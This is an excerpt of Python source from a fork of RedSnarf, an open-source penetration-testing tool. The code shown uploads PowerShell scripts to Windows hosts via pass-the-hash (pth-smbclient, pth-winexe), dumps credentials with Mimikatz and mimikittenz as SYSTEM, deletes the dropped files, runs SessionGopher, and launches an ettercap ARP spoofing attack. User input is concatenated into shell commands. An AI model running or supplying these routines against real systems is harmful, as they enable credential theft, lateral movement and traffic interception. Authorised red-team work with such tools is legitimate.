#! /usr/bin/python
# Original Release as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
# https://github.com/nccgroup/redsnarf
# Released under Apache V2 see LICENCE for more information
# 
# This is my personal build/fork of this project which I was heavily involved in during my time at NCC
		...
		if not "nt authority\system" in services:
			...
			if massmimi_dump in yesanswers:
				try:
					...
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"/ps_scripts/"+"; put a a.ps1\' 2>/dev/null")
					...
					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\a.ps1 c:\\mimi.ps1\" 2>/dev/null") 
			...
			if mimikittenz in yesanswers:
				try:
					...
					if not os.path.isfile('./ps_scripts/b'):
						print colored("[-]Cannot find Invoke-mimikittenz.ps1",'red')
						exit(1)
					print colored("[+]Looks good",'green')	
					
					shellscript = "./ps_scripts/b"
					InvokeFunction = "cathod"
					FunctionCommand = " > c:\\kittenz_creds.txt"
									
					cps(shellscript,mimikittenz,InvokeFunction,FunctionCommand,host,"system")
					...
					if os.path.isfile(outputpath+host+"/kittenz_creds.txt"):
						...
						if not os.path.isfile('/usr/bin/iconv'):
							...
							print colored("[+]kittenz output stored in "+outputpath+host+"/kittenz_creds1.txt",'yellow')
			...
			if session_gopher in yesanswers or session_gopher=="AV":
				try:
					...
					shellscript = "./ps_scripts/SessionGopher.ps1"
...
if arp_spoof!='n':
	...
	response=raw_input(colored("[+]You're sure you want to launch an ARP Spoof Attack? (Y/N):",'yellow'))
	if response.upper()=="Y":
		print colored("[+]Starting ARP Spoofing Attack - (Uses eth0 by default)",'green')
		print colored("\n[+]Output will be saved to /tmp/arp_spoof.txt",'yellow')
		print colored("[+]press q to stop spoofing",'yellow')
		print colored("[+]TIP - Whilst this is running open another terminal window and run ",'yellow')+colored("tail -f /tmp/arp_spoof.txt",'green')
		#TODO Add option to change eth0
		os.system("ettercap -i eth0 -T -M arp:remote //// > /tmp/arp_spoof.txt")
...
if liveips!='':
	...
	if usr_response !='':
		...
		ExcResponse=raw_input(colored("[+]Would you like to use an IP exclusion file?: (Y/N)",'yellow'))
		if ExcResponse.upper()=="Y":
			ExcPath=raw_input(colored("[+]Enter path to file?: ",'yellow'))
			if os.path.isfile(ExcPath):
				#Wrap nmap to get ips
				os.system("nmap -n -sn -vv "+liveips+" --excludefile "+ExcPath+" |grep 'Host is up' -B 1 |grep Nmap |cut -d \" \" -f 5 > "+usr_response +" 2>/dev/null")
			else:
				print colored("[-]File not found...",'red')
				sys.exit()
		else:
...
if windows_updates != 'n':
	if windows_updates in yesanswers:
		...
		print colored("   |   RedSnarf  | )  )",'red')
		print colored("   |   RD BUILD  |/  /",'red')
		print colored("   |             /  /    ",'red')
...
if custom_powershell in yesanswers or custom_powershell=="AV":
	...
	print colored("[+]Scripts in ps_scripts RedSnarf folder",'blue')
	os.system("ls ./ps_scripts/*.ps1")
